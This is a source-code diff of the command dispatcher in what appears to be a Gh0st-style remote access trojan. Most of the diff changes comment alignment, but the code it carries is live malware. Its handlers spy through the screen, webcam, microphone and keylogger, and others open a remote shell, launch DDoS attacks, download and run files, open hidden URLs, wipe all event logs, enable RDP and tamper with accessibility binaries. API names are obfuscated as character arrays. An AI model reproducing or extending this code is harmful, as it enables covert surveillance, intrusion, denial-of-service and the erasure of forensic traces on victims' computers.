@@ -102,56 +102,52 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
 	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
 	char sIQkS05[] = {'C','r','e','a','t','e','T','h','r','e','a','d','\0'};
-	CreateThreadT pCreateThread=(CreateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS05);
+	CreateThreadT_II pCreateThread=(CreateThreadT_II)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS05);
 
 	switch (lpBuffer[0])
 	{
 	case COMMAND_ACTIVED:
 		pInterlockedExchange((LONG *)&m_bIsActived, true);
 		break;
-	case COMMAND_LIST_DRIVE: // 文件管理
+	case COMMAND_LIST_DRIVE:		// 文件管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 		break;
-	case COMMAND_SCREEN_SPY: // 屏幕查看
+	case COMMAND_SCREEN_SPY:        // 屏幕查看
  		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
  			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
-	case COMMAND_WEBCAM: // 摄像头
+	case COMMAND_WEBCAM:            // 摄像头
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_AUDIO: //语音
+	case COMMAND_AUDIO:             //语音
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SHELL: // 远程sehll
+	case COMMAND_SHELL:             // 远程sehll
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
-	case COMMAND_KEYBOARD: // 键盘记录
+	case COMMAND_KEYBOARD:          // 键盘记录
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SYSTEM: // 系统管理
+	case COMMAND_SYSTEM:            // 系统管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
-
-		//DOSS
-	case COMMAND_DDOS_ATTACK:
+		break;		
+	case COMMAND_DDOS_ATTACK:       //DOSS
 		{
 			ATTACK m_Attack;
 			memcpy(&m_Attack,lpBuffer + 1,sizeof(ATTACK));
 			DDOSManager m_DDOSManager(&m_Attack);
 		}
 		break;
-		//DOSS
-
-	case COMMAND_DDOS_STOP:
+	case COMMAND_DDOS_STOP:         //DOSS
 		Stoping = FALSE;
 		 break;
-		 //DOSS
+
 		 ////////////////////////以下是主机空闲的代码////////////////////////
 	case COMMAND_FREE_PROCESS:
 		{	
@@ -173,34 +169,34 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		}
 		break;
 		///////////////////////////////////////////////////////////////////////
-//DOSS
-	case COMMAND_DOWN_EXEC: // 下载者
+
+	case COMMAND_DOWN_EXEC:        // 下载者
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
-		pSleep(100); // 传递参数用
+		pSleep(100);               // 传递参数用
 		break;
-	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
+	case COMMAND_OPEN_URL_SHOW:    // 显示打开网页
 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
 		break;
-	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
+	case COMMAND_OPEN_URL_HIDE:    // 隐藏打开网页
 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
 		break;
-	case COMMAND_REMOVE: // 卸载,
+	case COMMAND_REMOVE:           // 卸载,
 		UnInstallService();
 		break;
-	case COMMAND_CLEAN_ALL: // 清除全部日志
+	case COMMAND_CLEAN_ALL:        // 清除全部日志
 		CleanAllEvent();
 		break;
-	case COMMAND_SESSION: // 会话管理
+	case COMMAND_SESSION:          // 会话管理
 		CSystemManager::ShutdownWindows(lpBuffer[1]);
 		break;
-	case COMMAND_RENAME_REMARK: // 改备注
+	case COMMAND_RENAME_REMARK:    // 改备注
 		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
 		break;
-	case COMMAND_CHANGE_GROUP: // 改分组
+	case COMMAND_CHANGE_GROUP:     // 改分组
 		SetGroup( m_strServiceName, (LPCTSTR)(lpBuffer + 1));
 		break;
-	case COMMAND_UPDATE_SERVER: // 更新服务端
+	case COMMAND_UPDATE_SERVER:    // 更新服务端
 		if (UpdateServer((char *)lpBuffer + 1))
 			UnInstallService();
 		break;
@@ -211,25 +207,25 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SERMANAGER:  // 服务管理
+	case COMMAND_SERMANAGER:       // 服务管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SHOW_MSG:  // 发送信息
+	case COMMAND_SHOW_MSG:         // 发送信息
 		{
 			pCloseHandle(pCreateThread(NULL,NULL,Loop_MsgBox,&lpBuffer[1],NULL,NULL));
 			pSleep(500);
 		}
 		break;
-	case COMMAND_SERVER_START:  //服务器管理
+	case COMMAND_SERVER_START:     //服务器管理
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_start, 
 			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
 		break;
-	case COMMAND_OPEN_3389: // 开启3389
+	case COMMAND_OPEN_3389:        // 开启3389
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Open3389, 
 			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
 		break;
-	case COMMAND_DEL_SHIFTOSK:	//服务器操作
+	case COMMAND_DEL_SHIFTOSK:	   //服务器操作
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_operation,
 			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
 		break;
@@ -269,12 +265,12 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		catch(...){}
 		break;
 		*/
-	case COMMAND_SENDFILE_HIDE:  // 隐藏运行
+	case COMMAND_SENDFILE_HIDE:     // 隐藏运行
 		{
 			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_HIDE);
 		}
 		break;
-	case COMMAND_SENDFILE_NORMAL:  // 显示运行
+	case COMMAND_SENDFILE_NORMAL:   // 显示运行
 		{
 			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_SHOWNORMAL);
 		}
@@ -284,7 +280,7 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 2);
 		}
 		break;
-	case COMMAND_SENDFILE_UPDATA:  // 更新运行
+	case COMMAND_SENDFILE_UPDATA:   // 更新运行
 		{
 			if (OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 3))
 				UnInstallService();
